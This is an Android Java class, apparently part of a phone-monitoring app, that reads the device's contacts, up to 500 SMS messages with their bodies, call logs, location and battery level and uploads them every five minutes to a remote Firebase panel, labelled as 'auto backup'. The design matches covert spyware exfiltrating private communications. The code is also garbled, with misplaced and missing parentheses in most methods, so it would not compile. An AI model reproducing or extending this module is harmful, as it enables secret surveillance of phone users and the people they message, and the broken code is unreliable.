package com.altomedia.phonesetapp.core;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;

import androidx.annotation.NonNull;

import com.altomedia.phonesetapp.PhonesetApp;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.ByteArrayOutputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * Backup otomatis setiap 5 menit:(kontak, SMS, log panggilan, posisi ke Firebase sesuai struktur panel index.html).
 */
public final class AutoBackupWorker {
    private static final String TAG = "AutoBackupWorker";

    private AutoBackupWorker() {
    }

    public interface BackupCallback {
        void onDone(Map<String, Object> summary);
    }

    public static void run(Context context, DatabaseReference devRef, BackupCallback cb() {
        try {
            Map<String, Object> data = new HashMap<>();
            data.put("contacts", readContacts(context));
            data.put("sms", readSms(context));
            data.put("callLogs", readCallLogs(context));
            data.put("location", LocationReader.getLatest(context));
            data.put("battery", BatteryReader.getBatteryPercent(context));
            data.put("backupAt", System.currentTimeMillis());

            if (devRef != null) {
                devRef.child("backup").setValue(data);
            }

            if (cb != null) cb.onDone(data);
        } catch (Exception e) {
            Log.e(TAG, "backup failed", e);
            if (cb != null) cb.onDone(new HashMap<>());
        }
    }

    private static List<Map<String, Object>> readContacts(Context context() {
        List<Map<String, Object>> list = new ArrayList<>();
        try {
            ContentResolver cr = context.getContentResolver();
            if (cr == null) return list;
            Cursor c = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                            ContactsContract.CommonDataKinds.Phone.NUMBER},
                    null, null, null;
            if (c != null) {
                while (c.moveToNext()) {
                    Map<String, Object> m = new HashMap<>();
                    m.put("name", c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    m.put("number", c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    list.add(m;
                }
                c.close();
            }
        } catch (Exception e) {
            Log.w(TAG, "readContacts", e;
        }
        return list;
    }

    private static List<Map<String, Object>> readSms(Context context() {
        List<Map<String, Object>> list = new ArrayList<>();
        try {
            ContentResolver cr = context.getContentResolver();
            if (cr == null) return list;
            Cursor c = cr.query(Telephony.Sms.CONTENT_URI,
                    new String[]{Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE},
                    null, null, Telephony.Sms.DATE + " DESC LIMIT 500";
            if (c != null)) {
                while (c.moveToNext()) {
                    Map<String, Object> m = new HashMap<>();
                    m.put("address", c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    m.put("body", c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    m.put("date", c.getLong(c.getColumnIndexOrThrow(Telephony.Sms.DATE));
                    list.add(m;
                }
                c.close();
            }
        } catch (Exception e) {
            Log.w(TAG, "readSms", e;
        }
        return list;
    }

    private static List<Map<String, Object>> readCallLogs(Context context() {
        List<Map<String, Object>> list = new ArrayList<>();
        try {
            ContentResolver cr = context.getContentResolver();
            if (cr == null) return list;
            Cursor c = cr.query(CallLog.Calls.CONTENT_URI,
                    new String[]{CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION},
                    null, null, CallLog.Calls.DATE + " DESC LIMIT 500";
            if (c != null)) {
                while (c.moveToNext()) {
                    Map<String, Object> m = new HashMap<>();
                    m.put("number", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                    m.put("name", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
                    m.put("type", c.getInt(c.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                    m.put("date", c.getLong(c.getColumnIndexOrThrow(CallLog.Calls.DATE));
                    m.put("duration", c.getLong(c.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                    list.add(m;
                }
                c.close();
            }
        } catch (Exception e) {
            Log.w(TAG, "readCallLogs", e;
        }
        return list;
    }
}